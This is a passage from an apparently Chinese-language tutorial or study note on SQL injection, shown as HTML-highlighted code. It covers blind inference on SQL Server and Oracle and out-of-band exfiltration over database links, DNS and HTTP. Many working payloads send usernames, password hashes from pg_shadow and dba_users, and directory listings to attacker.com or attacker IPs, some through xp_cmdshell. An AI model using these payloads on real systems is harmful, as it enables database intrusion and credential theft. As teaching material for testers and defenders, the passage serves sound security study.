punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">''</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>当ASP.NET应用程序使用web.config配置文件的＜customError＞标记定义的出错页面(error page)来捕获未处理的异常时，可以添加或修改 aspxerrorpage参数，使其指向一个并不存在的页面，这样就可以旁路(bypass)出错页面。因此，如果下面的请求在功能上重定向到一个用户自定义的出错页面，请求常常会泄漏它所捕获的底层错误:</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">count_reviews<span class=\"token punctuation\">.</span>aspx?review_author<span class=\"token operator\">=</span>MadBob'<span class=\"token operator\">&amp;</span>aspxerrorpath<span class=\"token operator\">=</span><span class=\"token operator\">/</span>foo<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>语法上不能存在错误，因为这会导致在执行查询之前总是失败，只 能通过某些条件来引发查询失败。可通过结合使用除数为0的子句和CASE条件来实现该目的:</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> reviews <span class=\"token keyword\">WHERE</span> review_author<span class=\"token operator\">=</span><span class=\"token string\">'MadBob'</span><span class=\"token operator\">+</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">CASE</span> <span class=\"token keyword\">WHEN</span> ASCII<span class=\"token punctuation\">(</span>SUBSTRING<span class=\"token punctuation\">(</span><span class=\"token keyword\">SYSTEM_USER</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&gt;</span>k <span class=\"token keyword\">THEN</span> CAST <span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token operator\">/</span><span class=\"token number\">0</span> <span class=\"token keyword\">AS</span> <span class=\"token keyword\">CHAR</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">END</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"Oracle响应技术\"><a href=\"#Oracle响应技术\" class=\"headerlink\" title=\"Oracle响应技术\"></a>Oracle响应技术</h4><p>结构和上述数据库相似，依赖的函数不同</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> reviews <span class=\"token keyword\">WHERE</span> review_author<span class=\"token operator\">=</span><span class=\"token string\">'MadBob'</span> <span class=\"token operator\">AND</span> SYS_CONTEXT<span class=\"token punctuation\">(</span><span class=\"token string\">'USE RENV'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'ISDBA'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span><span class=\"token string\">'TRUE'</span>；\n<span class=\"token comment\">#逐位推断，根据第二个注入谓词是否返回结果来测试状态：</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> reviews <span class=\"token keyword\">WHERE</span> review_author<span class=\"token operator\">=</span><span class=\"token string\">'MadBob'</span>\n<span class=\"token operator\">AND</span> BITAND<span class=\"token punctuation\">(</span>ASCII<span class=\"token punctuation\">(</span>SUBSTR<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>j<span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>j\n<span class=\"token comment\">#二分搜索</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> reviews <span class=\"token keyword\">WHERE</span> review_author<span class=\"token operator\">=</span><span class=\"token string\">'MadBob'</span> <span class=\"token operator\">AND</span> ASCII<span class=\"token punctuation\">(</span>SUBSTR<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&gt;</span>k\n<span class=\"token comment\">#使用Oracle的字符串连接技术来确保在函数或过程参数列表中安全地使用,该技术使用连接和CASE语句将利用重写为拆分与平衡过的字符串</span>\nMad<span class=\"token string\">'||(SELECT CASE WHEN (ASCII(SUBSTR((...),i,1))&gt;k THEN '</span>Bob<span class=\"token string\">' ELSE '' END FROM DUAL)||'</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">#上述代码只有在推断测试返回真时才会产生完整的MadBob字符串</span>\n<span class=\"token comment\">#使用除数为0子句来产生运行时错误，这与SQL Server中的操作相似</span>\nMadBob<span class=\"token string\">'||(SELECT CASE WHEN BITAND((ASCII(SUBSTR((...),i,1))2^j)=2^j THEN CAST(1/0 AS CHAR) ELSE '' END FROM DUAL)||'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"返回多位信息\"><a href=\"#返回多位信息\" class=\"headerlink\" title=\"返回多位信息\"></a>返回多位信息</h4><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">#逐位</span>\n<span class=\"token keyword\">CASE</span>\n<span class=\"token keyword\">WHEN</span> ASCII<span class=\"token punctuation\">(</span>SUBSTRING<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>j<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>j<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token number\">0</span>\n<span class=\"token keyword\">THEN</span> <span class=\"token keyword\">WAITFOR</span> DELAY <span class=\"token string\">'00:00:00'</span>\n<span class=\"token keyword\">WHEN</span> ASCII<span class=\"token punctuation\">(</span>SUBSTRING<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>j<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>j<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>j\n<span class=\"token keyword\">THEN</span> <span class=\"token keyword\">WAITFOR</span> DELAY <span class=\"token string\">'00:00:05'</span>\n<span class=\"token keyword\">WHEN</span> ASCII<span class=\"token punctuation\">(</span>SUBSTRING<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>j<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>j<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span><span class=\"token number\">2</span><span class=\"token operator\">^</span>j<span class=\"token operator\">+</span><span class=\"token number\">1</span>\n<span class=\"token keyword\">THEN</span> <span class=\"token keyword\">WAITFOR</span> DELAY <span class=\"token string\">'00:00:10'</span>\n<span class=\"token keyword\">ELSE</span>\n<span class=\"token keyword\">THEN</span> <span class=\"token keyword\">WAITFOR</span> DELAY <span class=\"token string\">'00:00:15'</span>\n<span class=\"token keyword\">END</span>\n\n<span class=\"token comment\">#二分</span>\n<span class=\"token keyword\">CASE</span>\n<span class=\"token keyword\">WHEN</span> ASCII<span class=\"token punctuation\">(</span>SUBSTRING<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&gt;</span>k\n<span class=\"token keyword\">THEN</span> <span class=\"token keyword\">WAITFOR</span> DELAY <span class=\"token string\">'00:00:05'</span>\n<span class=\"token keyword\">WHEN</span> ASCII<span class=\"token punctuation\">(</span>SUBSTRING<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=</span>k\n<span class=\"token keyword\">THEN</span> <span class=\"token number\">1</span><span class=\"token operator\">/</span><span class=\"token number\">0</span>\n<span class=\"token keyword\">ELSE</span>\n<span class=\"token keyword\">THEN</span> <span class=\"token keyword\">WAITFOR</span> DELAY <span class=\"token string\">'00:00:00'</span>\n<span class=\"token keyword\">END</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"使用非主流通道\"><a href=\"#使用非主流通道\" class=\"headerlink\" title=\"使用非主流通道\"></a>使用非主流通道</h3><p>数据库连接、DNS、e-mail和HTTP</p>\n<h4 id=\"数据库连接\"><a href=\"#数据库连接\" class=\"headerlink\" title=\"数据库连接\"></a>数据库连接</h4><p>针对mssql，攻击者可通过通道来创建从受害者数据库到攻击者数据库的连接，并通过该连接传递查询的数据。可使用OPENROWSET命令实现该目的，要想攻击成功，攻击者必须能够在受害者数据库上打开一条通向攻击者数据库的TCP(传输控制协议)连接，默认使用的是1433端口。如果受害者机器上配有出口过滤功能，或者攻击者正在执行出口过滤，那么连接就会失败。只需修改目的IP地址后面的端口号即可连接到其他端口。</p>\n<p>示例：连接到地址为10.0.2.2的mssql用户sa并执行SQL语句</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> <span class=\"token keyword\">OPENROWSET</span><span class=\"token punctuation\">(</span><span class=\"token string\">'SQLOLEDB'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Network=DBMSSOCN;\nAddress=10.0.2.2;uid=sa;pwd=Mypassword'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'SELECT review_author FROM reviews'</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>向外部数据库传递数据</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> <span class=\"token keyword\">OPENROWSET</span><span class=\"token punctuation\">(</span><span class=\"token string\">'SQLOLEDB'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Network=DBMSOCN;\nAddress=192.168.0.1;uid=foo;pwd=password'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'SELECT * FROM attacker_table'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">SELECT</span> name <span class=\"token keyword\">FROM</span> sysobjects <span class=\"token keyword\">WHERE</span> xtype<span class=\"token operator\">=</span><span class=\"token string\">'U'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>若拥有管理员权限并启动了xp_cmdshell</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">#下列查询将使目标数据库发送C:\\路径下的文件和目录列表：</span>\n<span class=\"token keyword\">INSERT</span> <span class=\"token keyword\">INTO</span> <span class=\"token keyword\">OPENROWSET</span><span class=\"token punctuation\">(</span><span class=\"token string\">'SQLOLEDB'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'Network=DBMSSOCN;\nAddress=www.attacker.com:80; uid=sa; pwd=53kr3t'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'SELECT * FROM table'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">EXEC</span> master<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>xp_cmdshell 'dir C:\\'<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>oracle也支持数据库连接，但是不能镶嵌其他查询</p>\n<p>PostgreSQL9.1或更高版本超级用户启用dblink拓展</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CREATE</span> EXTENSION dblink<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>利用dblink系列命令从攻击者数据库向由攻击者控制的PostgreSQL数据库实例复制数据。但是这些函数仅对行进行操作，而不是对结果集进行操作。如果按照这种方式，请先准备好编写依靠游标(cursor)遍历数据的PL/pgSQL函数。</p>\n<p>例子：转储了数据库用户及其散列后的密码：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">CREATE</span> <span class=\"token operator\">OR</span> <span class=\"token keyword\">REPLACE</span> <span class=\"token keyword\">FUNCTION</span> dumper<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">RETURNS</span> void <span class=\"token keyword\">AS</span> $$\n<span class=\"token keyword\">DECLARE</span>\nrvar record<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">BEGIN</span>\n<span class=\"token keyword\">FOR</span> rvar <span class=\"token operator\">in</span> <span class=\"token keyword\">SELECT</span> usename<span class=\"token operator\">||</span><span class=\"token string\">','</span><span class=\"token operator\">||</span>passwd <span class=\"token keyword\">as</span> c <span class=\"token keyword\">FROM</span> pg_shadow <span class=\"token keyword\">LOOP</span>\nPERFORM dblink_exec<span class=\"token punctuation\">(</span><span class=\"token string\">'host=172.16.0.100 dbname=db user=uname password=Pass'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'insert into dumper values('''</span><span class=\"token operator\">||</span>rvar<span class=\"token punctuation\">.</span>c<span class=\"token operator\">||</span><span class=\"token string\">''')'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">END</span> <span class=\"token keyword\">LOOP</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">END</span><span class=\"token punctuation\">;</span>\n$$ <span class=\"token keyword\">LANGUAGE</span> <span class=\"token string\">'plpgsql'</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"DNS渗透\"><a href=\"#DNS渗透\" class=\"headerlink\" title=\"DNS渗透\"></a>DNS渗透</h4><p>网络只有入口过滤而没有出口过滤时，或者仅有TCP出口过滤时，数据库可直接向攻击者发送DNS请求。</p>\n<p>PostgreSQL、SQL server、Oracle均能直接或间接引发DNS请求，Oracle使用UTL_INADDR包，这个包包含一个明确用于查找转发条目(forward entry)的GET_HOST_ ADDRESS函数和一个用于查找逆向条目的GET_HOST_NAME函数：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">UTL_INADDR<span class=\"token punctuation\">.</span>GET_HOST_ADDRESS<span class=\"token punctuation\">(</span><span class=\"token string\">'www.victim.com'</span><span class=\"token punctuation\">)</span> \n<span class=\"token comment\">-- 返回192.168.1.0</span>\n\nUTL_INADDR<span class=\"token punctuation\">.</span>GET_HOST_NAME<span class=\"token punctuation\">(</span><span class=\"token string\">'192.168.1.0'</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">-- 返回www.victim.com</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>DNS函数不需要使用PL/SQL块，可以直接插入子查询或谓词</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">#插入谓词提取数据库登录用户</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> reviews <span class=\"token keyword\">WHERE</span> review_author<span class=\"token operator\">=</span>UTL_INADDR<span class=\"token punctuation\">.</span>GET_HOST_ADDRESS<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">USER</span> <span class=\"token keyword\">FROM</span> DUAL<span class=\"token punctuation\">)</span><span class=\"token operator\">||</span><span class=\"token string\">'.attacker.com'</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>PostgreSQL使用XML解析库的一个小技巧来初始化DNS查询</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">#将一个包含数据库用户名的查找发送给DNS服务器，以查找attacker.com</span>\n<span class=\"token keyword\">SELECT</span> XMLPARSE<span class=\"token punctuation\">(</span>document <span class=\"token string\">'&lt;?xml version:\"1.0\" encoding=\"ISO-8859-1\"?&gt;&lt;!DOCTYPE x [ &lt;!ELEMENT x ANY &gt;&lt;!ENTITY xx SYSTEM \"http://'</span><span class=\"token operator\">||</span><span class=\"token keyword\">user</span><span class=\"token operator\">||</span>'attacker<span class=\"token punctuation\">.</span>com<span class=\"token punctuation\">.</span><span class=\"token operator\">/</span>\"<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">]</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span>x<span class=\"token operator\">&gt;</span><span class=\"token operator\">&amp;</span>xx<span class=\"token punctuation\">;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>x<span class=\"token operator\">&gt;</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>只要PostgreSQL安装了dblink,在连接字符串中就可以指定一个主机名(hostname)以引发一次DNS查找，但这要求具有超级用户的访问权限。</p>\n<p>mssql可以通过xp_cmdshell存储过程来执行nslookup命令</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">EXEC</span> master<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>xp_cmdshell <span class=\"token string\">'nslookup www.victim'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>如果攻击者的DNS服务器是公共可用的192.168.1.1，那么直接查找DNS请求</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">EXEC</span> master<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>xp_cmdshell <span class=\"token string\">'nslookup www.victim 192.168.1.1'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>可以将这些代码绑定到一些shell脚本中以提取目录内容</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">EXEC master<span class=\"token punctuation\">..</span>xp_cmdshell <span class=\"token string\">'for /F \"tokens=5\"%i in ('</span>'dir c:<span class=\"token punctuation\">\\</span>'<span class=\"token string\">') do nslookup %i.attacker.com'</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这是数据库所在机器的默认搜索域。可以为传递给nslookup的名称添加一个点号(.)，从而阻止在默认域中进行查找。</p>\n<p>其他储存过程,这些存储过程依赖于Windows对网络</p>\n<p>UNC(Universal Naming Convention,通用命名约定)路径的内在支持</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">xp_getfiledetails<span class=\"token punctuation\">(</span><span class=\"token keyword\">SQL</span> Server <span class=\"token number\">2000</span><span class=\"token punctuation\">,</span>需要一个文件路径<span class=\"token punctuation\">)</span>\nxp_fileexist<span class=\"token punctuation\">(</span><span class=\"token keyword\">SQL</span> Server <span class=\"token number\">2000</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2005</span>、<span class=\"token number\">2008</span> 和 <span class=\"token number\">2008</span> R2<span class=\"token punctuation\">,</span>需要一个文件路径<span class=\"token punctuation\">)</span>\nxp_dirtree<span class=\"token punctuation\">(</span><span class=\"token keyword\">SQL</span> Server <span class=\"token number\">2000.</span> <span class=\"token number\">2005</span>、<span class=\"token number\">2008</span> 和 <span class=\"token number\">2008</span> R2<span class=\"token punctuation\">,</span>需要一个文件路径<span class=\"token punctuation\">)</span> \n\n<span class=\"token keyword\">DECLARE</span> <span class=\"token variable\">@a</span> <span class=\"token keyword\">CHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">SET</span> <span class=\"token variable\">@a</span><span class=\"token operator\">=</span><span class=\"token string\">'\\\\'</span><span class=\"token operator\">+</span><span class=\"token keyword\">SYSTEM_USER</span><span class=\"token operator\">+</span><span class=\"token string\">'.attacker.com.'</span><span class=\"token punctuation\">;</span> <span class=\"token keyword\">EXEC</span> master<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>xp_dirtree <span class=\"token variable\">@a</span>\n\n<span class=\"token comment\">#存储过程的参数列表禁止使用字符串连接，因而上述代码使用了一个中间变量来保存路径。SQL间接引发了对主机名sa.attacker.com的DNS查找，最终证明了是在使用管理员账户进行登录。</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>通过xp_cmdshell执行DNS查找时，路径中出现非法字符会导致桩解析器 (resolver stub)失败，从而无法尝试查找。同样，UNC路径多于128个字符也会导致桩解析器失败。可以先将希望检索的数据转换成完全能够被DNS处理的格式，一种做法是将数据转换成十六进制表示。SQL Server包含一个名为FN_VARBINTOHEXSTR() 的函数，它接收类型为VARBINARY的参数并返回该数据的十六进制表示。例如：</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> master<span class=\"token punctuation\">.</span>dbo<span class=\"token punctuation\">.</span>fn_varbintohexstr<span class=\"token punctuation\">(</span>CAST<span class=\"token punctuation\">(</span><span class=\"token keyword\">SYSTEM_USER</span> <span class=\"token keyword\">as</span> <span class=\"token keyword\">VARBINARY</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\">-- 0x73006100</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>长度问题，substring()</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">DECLARE</span> <span class=\"token variable\">@a</span> <span class=\"token keyword\">CHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">SELECT</span> <span class=\"token variable\">@a</span><span class=\"token operator\">=</span><span class=\"token string\">'\\\\'</span><span class=\"token operator\">+</span>master<span class=\"token punctuation\">.</span>dbo<span class=\"token punctuation\">.</span>fn_varbintohexstr<span class=\"token punctuation\">(</span>CAST<span class=\"token punctuation\">(</span>SUBSTRING<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> <span class=\"token keyword\">TOP</span> <span class=\"token number\">1</span> CAST<span class=\"token punctuation\">(</span>review_body <span class=\"token keyword\">AS</span> <span class=\"token keyword\">CHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> reviews<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">26</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">AS</span> <span class=\"token keyword\">VARBINARY</span><span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">'.attacker.com.'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">EXEC</span> master<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>xp_dirtree <span class=\"token variable\">@a</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">-- \"0x4d6f7669657320696e20746869732067656e7265206f667465.attacker.com.\" 或 \"Movies in this genre ofte\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>多行操作需要封装</p>\n<h4 id=\"e-mail渗透\"><a href=\"#e-mail渗透\" class=\"headerlink\" title=\"e-mail渗透\"></a>e-mail渗透</h4><p>跟DNS类似，使用SMTP（Simple Mail Transfer Protocol,简单邮件传输协议）发送e-mail不需要直接连接发送者和接收者。该方法的限制在于异步性上。发送利用之后，e-mail需要过一段时间才能到达。</p>\n<h4 id=\"HTTP渗透\"><a href=\"#HTTP渗透\" class=\"headerlink\" title=\"HTTP渗透\"></a>HTTP渗透</h4><p>适用场合是：数据库服务器拥有网络层许可来访问由攻击者控制的Web资源。SQL Server和MySQL没有包含构造HTTP请求的默认机制，使用自定义扩展实现，PostgreSQL可以使用外部语言封装成HTTP的函数，Oracle由UTL_HTTP和HTTPURITYPE包提供，public权限。</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> reviews <span class=\"token keyword\">WHERE</span>\nreview_author<span class=\"token operator\">=</span>UTL_HTTP<span class=\"token punctuation\">.</span>REQUEST<span class=\"token punctuation\">(</span><span class=\"token string\">'www.attacker.com/'</span><span class=\"token operator\">||</span><span class=\"token keyword\">USER</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>复查web日志会发现一条包含数据库登录的日志</p>\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">#Oracle llg：</span>\n<span class=\"token string\">'a'</span><span class=\"token operator\">||</span>CHR<span class=\"token punctuation\">(</span>UTL_HTTP<span class=\"token punctuation\">.</span>REQUEST<span class=\"token punctuation\">(</span><span class=\"token string\">'www.attacker.com/'</span><span class=\"token operator\">||</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> sys<span class=\"token punctuation\">.</span>stragg<span class=\"token punctuation\">(</span><span class=\"token keyword\">DISTINCT</span> username<span class=\"token operator\">||</span>chr<span class=\"token punctuation\">(</span><span class=\"token number\">61</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span>password<span class=\"token operator\">||</span>chr<span class=\"token punctuation\">(</span><span class=\"token number\">59</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">FROM</span> dba_users<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">||</span>'a\n\n<span class=\"token comment\">-- 将所有用户名和口令发送给了攻击者的访问日志</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token comment\">#Oracle 9z R2和更高版本的+XMLB：</span>\n<span class=\"token string\">'a'</span><span class=\"token operator\">||</span>CHR<span class=\"token punctuation\">(</span>UTL_HTTP<span class=\"token punctuation\">.</span>REQUEST<span class=\"token punctuation\">(</span><span class=\"token string\">'attacker.com/'</span><span class=\"token operator\">||</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">SELECT</span> xmltransform<span class=\"token punctuation\">(</span>sys_xmlagg<span class=\"token 